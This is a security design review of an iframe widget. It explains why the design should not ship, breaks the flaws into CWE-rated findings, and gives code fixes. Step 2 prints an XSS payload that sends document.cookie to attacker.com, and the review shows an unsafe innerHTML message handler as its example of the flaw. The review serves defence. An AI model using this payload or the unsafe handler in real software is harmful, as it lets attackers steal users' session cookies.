No. The composite design should not ship.

Each property looks acceptable in isolation. Together they form a complete exploit chain.

---

## Attack Chain Analysis

**Step 1**: Attacker creates a page that embeds the widget in an iframe. No `X-Frame-Options` permits this. Any origin can embed the widget.

**Step 2**: Attacker's page posts a message to the iframe:

```javascript
widgetFrame.contentWindow.postMessage({ html: '<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>' }, '*');
```

**Step 3**: The widget's `message` handler reads `event.data.html` and writes it into the DOM via `innerHTML`. No origin check. No sanitization. The attacker-controlled HTML executes inside the widget's origin.

**Step 4**: No CSP exists to block the injected script, the external fetch, or the inline event handler. Nothing stops exfiltration.

Result: stored session tokens, cookies, and any data the widget's origin can access are exfiltrated. The attacker needs no credentials and no existing foothold.

---

## Vulnerability Breakdown

| ID | CWE | Severity | CVSS Estimate | Finding |
|----|-----|----------|---------------|---------|
| W-01 | CWE-79 (XSS via innerHTML) | Critical | 9.3 | `event.data.html` written directly to DOM without sanitization |
| W-02 | CWE-346 (Origin Validation Error) | High | 8.1 | `message` handler accepts messages from any origin |
| W-03 | CWE-693 (Missing CSP) | High | 7.5 | No Content-Security-Policy header; no inline script blocking |
| W-04 | CWE-1021 (Clickjacking/Framing) | Medium | 6.5 | No frame-ancestors restriction permits hostile embedding |

**Composite Risk Score: 9.3/10** (chain exploitability, not individual scores)

The individual approvals are not wrong. The composite was never reviewed. That is the gap.

---

## Required Mitigations Before Ship

### W-01: Eliminate innerHTML with untrusted input (BLOCKING)

Never assign message-derived content via `innerHTML`.

```javascript
// UNSAFE - current implementation
handler = (event) => {
  div.innerHTML = event.data.html;
};

// SAFE option A - use textContent if HTML is not required
handler = (event) => {
  div.textContent = event.data.text;
};

// SAFE option B - sanitize if HTML rendering is required
import DOMPurify from 'dompurify';
handler = (event) => {
  div.innerHTML = DOMPurify.sanitize(event.data.html, { USE_PROFILES: { html: true } });
};
```

### W-02: Validate event.origin (BLOCKING)

```javascript
const ALLOWED_ORIGINS = new Set([
  'https://yourapp.com',
  'https://partner-a.com',
]);

window.addEventListener('message', (event) => {
  if (!ALLOWED_ORIGINS.has(event.origin)) {
    return; // drop silently
  }
  // process event.data
});
```

If the partner list is dynamic, load it server-side at widget initialization and inject it as a allowlist. Do not use `event.origin === '*'` or skip the check.

### W-03: Add Content-Security-Policy (BLOCKING)

Add a CSP header on the widget's own origin. This is the last line of defense if W-01 or W-02 have implementation errors.

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  connect-src 'self' https://api.yourapp.com;
  frame-ancestors https://partner-a.com https://partner-b.com;
```

`frame-ancestors` also replaces `X-Frame-Options` with a more precise control. It lets legitimate partners embed while blocking hostile third-party framing.

